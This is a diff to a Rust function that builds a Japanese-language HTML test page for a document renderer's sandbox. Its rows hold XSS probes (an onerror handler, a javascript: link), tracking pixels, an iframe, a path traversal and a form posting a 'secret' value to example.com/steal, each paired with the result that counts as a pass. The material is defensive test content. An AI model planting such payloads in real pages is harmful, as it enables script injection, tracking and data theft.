@@ -47,13 +47,13 @@ pub fn security_document() -> SafeDocument {
 <tr><td>インラインスクリプト</td><td id="js">スクリプト未実行 <span class="ok">OK</span></td></tr>
 <tr><td>onerror ハンドラー</td><td><img src="res/99" alt="" onerror="this.parentNode.innerHTML='<span class=ng>NG: onerror ran</span>'">発火しなければ OK</td></tr>
 <tr><td>javascript: リンク</td><td><a href="javascript:document.body.innerHTML='NG'">クリックしても何も起きなければ OK</a></td></tr>
-<tr><td>外部画像（追跡ピクセル）</td><td><img src="https://example.com/pixel.gif" width="1" height="1" alt="">読み込まれない（Rust 側の拒否数には出ない＝CSP で遮断）</td></tr>
+<tr><td>外部画像（追跡ピクセル）</td><td><img src="https://example.com/pixel.gif" width="1" height="1" alt="">読み込まれない（Blitz は拒否数 +1、WebView は CSP で遮断）</td></tr>
 <tr><td>外部 CSS</td><td class="remotecss">文字が赤くならなければ OK</td></tr>
 <tr><td>iframe</td><td><iframe src="https://example.com" width="120" height="40"></iframe> 空なら OK</td></tr>
 <tr><td>CID 画像（manifest 0 番）</td><td><img src="res/0" width="24" height="24" style="image-rendering:pixelated" alt="cid"> 赤い四角が出れば OK</td></tr>
 <tr><td>data: PNG</td><td><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==" width="24" height="24" style="image-rendering:pixelated" alt="data"> 赤い四角が出れば OK</td></tr>
 <tr><td>SVG リソース（manifest 1 番）</td><td><img src="res/1" width="24" height="24" alt="">表示されなければ OK（拒否数 +1）</td></tr>
-<tr><td>パス走査</td><td><img src="../res/0" width="24" height="24" alt="">表示されなければ OK</td></tr>
+<tr><td>パス走査</td><td><img src="../../../res/0" width="24" height="24" alt="">文書の外へは出られない（同じ文書内の画像に解決される）</td></tr>
 <tr><td>フォーム送信</td><td><form action="https://example.com/steal" method="post"><input name="p" value="secret"><button>送信</button></form>送信できなければ OK</td></tr>
 <tr><td>https リンク</td><td><a href="https://example.com/?from=fuu">example.com</a>（確認ダイアログが出れば OK）</td></tr>
 <tr><td>target=_blank</td><td><a href="https://example.org/" target="_blank">新規ウィンドウ</a>（ウィンドウは開かず確認ダイアログ）</td></tr>
